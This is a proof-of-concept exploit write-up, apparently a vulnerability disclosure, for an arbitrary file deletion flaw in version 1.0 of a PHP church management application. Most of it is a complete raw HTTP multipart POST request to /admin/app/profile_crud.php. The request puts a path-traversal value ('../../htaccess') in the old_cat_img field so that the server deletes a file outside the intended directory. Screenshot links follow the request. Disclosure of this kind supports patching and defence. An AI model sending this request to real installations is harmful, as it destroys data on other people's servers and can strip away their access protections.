### Exploit Title: Best church management software - Delete any file
### Date: 2025-02/11
### Exploit Author: xiahao@webray.com.cn
### Vendor Homepage: https://www.sourcecodester.com
### Software Link: https://www.sourcecodester.com/php/17856/best-church-management-software-free-download-full-version.html
### Version: 1.0
### Tested on: windows10 + phpstudy

# 1./admin/app/profile_crud.php Parameter old_cat_img has Delete any file

### Delete any file POC #1

```
POST /admin/app/profile_crud.php HTTP/1.1
Host: 127.0.0.1:8001
Content-Length: 455
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypIjOCND3CuxXt7PO
Cache-Control: no-cache
Accept: */*
Origin: chrome-extension://coohjcphdfgbiolnekdpbcijmhambjff
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundarypIjOCND3CuxXt7PO
Content-Disposition: form-data; name="update"

1 
------WebKitFormBoundarypIjOCND3CuxXt7PO
Content-Disposition: form-data; name="image"; filename="1px.png"
Content-Type: image/png

PNG

IHDRµIDATxÚcd0IEND®B
------WebKitFormBoundarypIjOCND3CuxXt7PO
Content-Disposition: form-data; name="old_cat_img"

../../htaccess
------WebKitFormBoundarypIjOCND3CuxXt7PO--

```

### Delete any file
![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/1739252420705.jpg "Best church management software")

![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/1739253340542.jpg "Best church management software")

![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/1739253104064.jpg "Best church management software")

![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/1739253107867.jpg "Best church management software")


